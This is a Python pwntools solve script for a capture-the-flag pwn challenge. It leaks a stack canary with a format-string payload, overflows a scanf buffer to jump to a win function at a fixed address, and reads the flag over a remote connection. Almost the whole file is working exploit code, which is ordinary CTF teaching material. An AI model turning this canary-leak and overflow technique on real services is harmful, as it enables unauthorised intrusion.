#!/usr/bin/env python3
"""
This was meant to be an easy challenge, so a lot of things are given:
- There's a buffer overflow with scanf("%s")
- There's an arbitrary printf
- There's a win function
- There's no PIE

So the intended easy solution is to leak the canary, then use a buffer overflow to overwrite the return address to the win function (using the known canary).
We use toasterpwn's quote to do this, but also the "arbitrary" string needs to have the right hash.
The hash is really simple, and it turns out we can do something like "  %27$p                               cc~~~~ ~~ ~~~~~       " to leak the canary.
???
Profit!

Appendix A: Solutions to the gisnep (not necessary to solve the challenge)
HELLO GOOD SIR CAN I ASK YOU A QUESTION ABOUT CRYPTOGRAPHY -- genni
THEY SHOULD CHANGE THE EMOJI BASED ON HOW LONG YOU TAKE 25MINS IS NOT A :TADA: MOMENT -- joseph
DO YOU PREFER SQUARES OR CUBES THERE IS NO CONTEXT OTHER THAN THIS QUESTION -- neobeo
WAIT SO DID WE FIND ANOTHER UNINTENDED FOR IT CLIT INJECTION OR SOMETHING -- superbeetlegamer
I THINK JOSEPH IS THE SCARIEST CRYPTO PLAYER TO EXIST -- toasterpwn
"""

from pwn import *
import sys


# this attack fails if certain characters are in the canary, so we'll need a few attempts
for i in range(4):
    io = remote(sys.argv[1], sys.argv[2])
    # "  %27$p                               cc~~~~ ~~ ~~~~~       "
    io.sendline(b'toasterpwn\n3%4 2 5 7 6$7p39c40c41~42~43~44~46~47~49~50~51~52~53~')
    io.readuntil(b'0x')
    canary = p64(int(io.readuntil(b' '), 16))
    io.sendline(canary * 7 + p64(0x40125b) + b'\nexit')

    io.sendline(b"cat flag.txt;exit")

    # retry logic
    res = io.recvall()
    if b"oiccflag" in res:
        print(res)
        break
    io.close()
